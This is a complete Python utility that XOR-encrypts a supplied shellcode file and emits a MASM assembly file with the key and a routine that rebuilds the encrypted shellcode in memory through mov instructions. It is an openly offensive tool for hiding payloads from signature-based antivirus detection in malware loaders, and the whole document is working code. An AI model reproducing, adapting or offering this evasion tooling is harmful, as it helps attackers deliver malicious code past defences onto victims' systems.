# Author    => Abdallah Mohamed (@0xNinjaCyclone)
# Email     => elsharifabdallah53@gmail.com
# Date      => September 11, 2025 / 01:46AM

import sys, random, struct, string, os.path

def get_data_elements(data):
    return list( map(ord, data) )

def encrypt_shellcode(shellcode, key):
    keySize = len( key )
    elements = get_data_elements( key )
    return bytes(
        ( shellcode[idx] ^ elements[idx % keySize] ) for idx in range( 0, len(shellcode) )
    )

def main():
    
    if len( sys.argv ) < 2:
        print( "\t[!] Error: No shellcode file provided" )
        print( f"\tUsage:\n\t\t{sys.argv[0]} <path/to/shellcode.bin> <EncryptionKey>\n" )
        return 1

    if not os.path.exists( sys.argv[1] ):
        print( f"[!] Error: Shellcode file does not exist at '{sys.argv[1]}'" )
        return 1
    
    enc_key = ''.join( random.choice(string.ascii_letters) for _ in range(random.randint(4, 8)) ) \
            if len( sys.argv ) < 3 \
            else \
                sys.argv[2]
    
    print(f"[*] Reading shellcode from: {sys.argv[1]}")
    with open( sys.argv[1], "rb" ) as f:
        sc = f.read()
    
    original_size = len(sc)
    print(f"[*] Original shellcode size: {original_size} bytes")
    
    sc += b"\x90" * ( 8 - len(sc) % 8 )
    print(f"[*] Padded shellcode size: {len(sc)} bytes (added {len(sc) - original_size} NOPs)")
    
    print(f"[*] Using encryption key: '{enc_key}' (length: {len(enc_key)} bytes)")
    obfcode = encrypt_shellcode( sc, enc_key )
    print(f"[*] Encrypted shellcode size: {len(obfcode)} bytes")
    
    output_file = "./shellcode.asm"
    print(f"[*] Writing assembly output to: {output_file}")
    with open( output_file, "w+" ) as f:
        print("[*] Generating assembly file structure")
        f.write( "SHELLCODE MACRO\nENDM\n" )
        f.write( "public SHELLSIZE\n" )
        f.write( "SHELLSIZE EQU 0%xh\n" % len(sc) )
        f.write( "public KEYSIZE\n" )
        f.write( "KEYSIZE EQU 0%xh\n" % len(enc_key) )
        f.write( ".data\n" )
        f.write( "public sc\n" )
        f.write( "sc dq %d dup(0)\n" % (len(obfcode) / 8) )

        f.write( "public key\n" )
        f.write( "key db " )
        for idx in range( len(enc_key) ):
            f.write( "0%xh" % ord(enc_key[idx]) )
            if idx+1 != len(enc_key):
                f.write( ", " )
        f.write( "\n" )

        f.write( ".code\n" )
        f.write( "init_sc proc\n" )
        print(f"[*] Writing {len(obfcode)//4} DWORD instructions for encrypted shellcode")
        for idx in range( 0, len(obfcode), 4 ):
            f.write( "\tmov dword ptr [sc + %d], 0%08Xh \n" % (idx, struct.unpack("<I", obfcode[idx:idx+4])[0]) )
        
        f.write( "ret\n" )
        f.write( "init_sc endp\n" )
    
    print(f"[+] Successfully generated encrypted shellcode assembly file")
    print(f"[+] Shellcode size: {len(sc)} bytes")
    print(f"[+] Key size: {len(enc_key)} bytes")
    print(f"[+] Output written to: {output_file}")

if __name__ == '__main__':
    main()